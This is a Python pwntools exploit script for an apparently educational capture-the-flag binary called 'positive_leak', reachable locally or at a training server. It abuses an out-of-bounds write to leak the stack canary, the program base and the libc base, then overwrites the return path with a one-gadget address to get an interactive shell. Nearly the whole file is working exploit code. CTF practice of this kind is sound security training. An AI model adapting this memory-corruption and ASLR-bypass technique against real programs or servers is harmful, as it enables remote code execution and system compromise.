from pwn import *

CHALL_PATH = './positive_leak'
CHALL = ELF(CHALL_PATH)
LIBC_PATH = './libc.so.6'
LIBC = ELF(LIBC_PATH)
COMMANDS = """

    b *main
"""

context.arch = "amd64"

if args.GDB:
    p = gdb.debug(CHALL_PATH, COMMANDS)

elif args.REMOTE:
    p = remote('positive-leak.training.offensivedefensive.it', 8080, ssl = True)
    
else:
    p = process(CHALL_PATH)
    
# ---------------------------------------------------------------------------------------------------------------------------------------
# Leak to get the elf base address
# If we write at index 12 we overwrite the loop counter but because of some stack disallignement, we need 0xc00000000 = 51539607552
# Here we write -1 to stop the number insertion. Now we print the numbers and thanks to gdb we can identify the canary and a main address
# output[11] = canary & output[13] = main leak

p.recvuntil(b'> ')
p.sendline(b'0')

p.recvuntil(b'> ')
p.sendline(b'10')

for i in range(7):
    p.recv()
    p.sendline(str(i).encode())
    
p.recv()
p.sendline(str(51539607552).encode())

p.recv()
p.sendline(b'-1')

p.recvuntil(b'> ')
p.sendline(b'1')

list_numbers = []
for i in range(200):
    num = p.recvuntil(b'\n')
    list_numbers.append(num)
    
canary = list_numbers[11]
main = list_numbers[13]

OFFSET_BASE_LEAK = 5544 #0x15a8

canary = hex(int(canary.decode().strip()))
main = int(main.decode().strip()) - OFFSET_BASE_LEAK

print(f'Canary: {canary}')
print(f'Base address: {hex(main)}')

CHALL.address = main

# ---------------------------------------------------------------------------------------------------------------------------------------
# Leak to get the libc base address
# We can use the same method to leak the libc address

p.recvuntil(b'> ')
p.sendline(b'0')

p.recvuntil(b'> ')
p.sendline(b'10')

for i in range(7):
    p.recv()
    p.sendline(str(i).encode())
    
p.recv()
p.sendline(str(60129542144).encode())

p.recv()
p.sendline(b'-1')

p.recvuntil(b'> ')
p.sendline(b'1')

list_numbers = []
for i in range(200):
    num = p.recvuntil(b'\n')
    list_numbers.append(num)
    
OFFSET_BASE_LIBC = 172490 #0x2a1ca

libc = list_numbers[15]
libc = int(libc.decode().strip()) - OFFSET_BASE_LIBC

print(f'Libc address: {hex(libc)}')

LIBC.address = libc


# ---------------------------------------------------------------------------------------------------------------------------------------
# rop chain to get a shell

p.recvuntil(b'> ')
p.sendline(b'0')

p.recvuntil(b'> ')
p.sendline(b'10')

for i in range(7):
    p.recv()
    p.sendline(str(i).encode())
    
p.recv()
p.sendline(str(68719476736).encode())

OFFSET_MAGIC_GADGET = 980174 #0xef4ce

p.recv()
p.sendline(str(libc + OFFSET_MAGIC_GADGET).encode())

p.recv()
p.sendline(b'-1')

p.interactive()